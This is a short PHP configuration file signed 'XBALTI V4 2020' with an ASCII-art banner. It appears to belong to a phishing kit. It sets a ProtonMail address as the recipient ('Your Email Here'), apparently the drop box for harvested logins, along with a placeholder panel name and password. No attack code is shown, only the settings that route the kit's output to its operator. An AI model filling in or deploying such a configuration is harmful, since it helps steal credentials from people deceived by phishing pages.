<?php


/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                     
*/

//XBALTI V4 2020

$XBALTI_EMAIL = "dynamo12332@protonmail.com"; // Your Email Here :)

$yourname = "XBALTI"; // Your Name Here :)

$yourpass = "XBALTI"; // Your Password Here :)

?>

